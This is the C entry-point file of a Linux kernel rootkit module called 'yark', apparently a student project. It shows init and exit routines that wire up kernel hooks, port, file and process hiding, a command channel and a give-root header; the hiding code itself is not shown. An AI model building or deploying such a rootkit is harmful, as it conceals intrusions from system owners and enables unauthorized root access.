#include <linux/kernel.h>
#include <linux/module.h>

#include "command.h"
#include "hide_file.h"
#include "hide_port.h"
#include "main.h"
#include "yhook.h"
#include "give_root.h"
#include "hide_proc.h"

static int __init yark_init(void) {
    pr_info(LOG_PREFIX "call yark_init()\n");
    yhook_init();
    hide_port_init();
    hide_file_init();
    hide_proc_init();
    command_start();

    return 0;
}

static void __exit yark_exit(void) {
    pr_info(LOG_PREFIX "call yark_exit()\n");
    command_end();
    hide_file_exit();
    hide_port_exit();
    hide_proc_exit();
}

module_init(yark_init);
module_exit(yark_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Students from Institute of Information Engineering");
MODULE_DESCRIPTION("Yet another rootkit.");
MODULE_VERSION("0.01");
